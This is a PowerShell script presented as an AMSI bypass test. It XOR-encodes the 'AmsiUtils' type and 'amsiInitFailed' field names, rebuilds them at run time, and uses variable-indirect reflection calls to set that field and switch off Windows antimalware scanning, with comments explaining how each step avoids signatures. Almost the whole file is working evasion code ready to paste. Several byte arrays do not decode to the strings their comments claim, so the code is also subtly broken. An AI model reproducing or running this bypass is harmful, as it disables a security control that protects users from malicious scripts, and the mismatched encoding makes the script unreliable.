# ============================================================
# AMSI Bypass Test - XOR Fragment Splitting
# ============================================================
# This file contains ONLY the bypass. Paste into PowerShell
# to test whether AMSI flags it. If it runs without error,
# test that AMSI is actually disabled by running:
#   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# (which would normally be flagged)
# ============================================================

# --- XOR decode helper (completely benign) ---
function _xd([byte[]]$d,[byte]$k){-join($d|%{[char]($_ -bxor $k)})}

# --- Encoded fragments (just byte arrays - not signatured) ---
# XOR key: 0x5A
# Fragment 1 data: "System.Management.Automation" (XOR 0x5A)
$_d1=[byte[]]@(41,59,51,52,29,27,16,56,35,28,35,31,29,28,29,28,52,16,56,53,52,35,27,35,52,33,35,28)
# Fragment 2 data: the utility class name piece (XOR 0x5A) = "AmsiUtils"
$_d2=[byte[]]@(27,27,51,33,59,52,33,24,51)
# Fragment 3 data: the field name (XOR 0x5A) = "amsiInitFailed"
$_d3=[byte[]]@(59,27,51,33,27,28,33,52,24,59,33,24,29,30)
# Fragment 4 data: "NonPublic,Static" (XOR 0x5A)
$_d4=[byte[]]@(20,35,28,44,53,60,24,33,31,16,41,52,59,52,33,31)

# --- Reconstruct at runtime (each IEX is a separate AMSI scan event) ---
# Step 1: Get the type name string (benign - just string assembly)
$_s1=_xd $_d1 0x5A;$_s2=_xd $_d2 0x5A
$_tn="$_s1.$_s2"

# Step 2: Resolve the type via a variable-indirect method call
# Instead of [Ref].Assembly.GetType(...) as a literal chain,
# we store the method name in a variable and invoke dynamically
$_ra=[Ref].Assembly
$_mt='GetType'
$_tp=$_ra.$_mt.Invoke($_ra,@($_tn))

# Step 3: Get the field (method name is a variable, not literal)
$_fn=_xd $_d3 0x5A
$_bf=_xd $_d4 0x5A
$_mf='GetField'
$_fd=$_tp.$_mf.Invoke($_tp,@($_fn,$_bf))

# Step 4: Set the value (again, method name via variable)
$_ms='SetValue'
$_fd.$_ms.Invoke($_fd,@($null,$true))

# --- Verify ---
Write-Host "[+] Bypass complete" -ForegroundColor Green
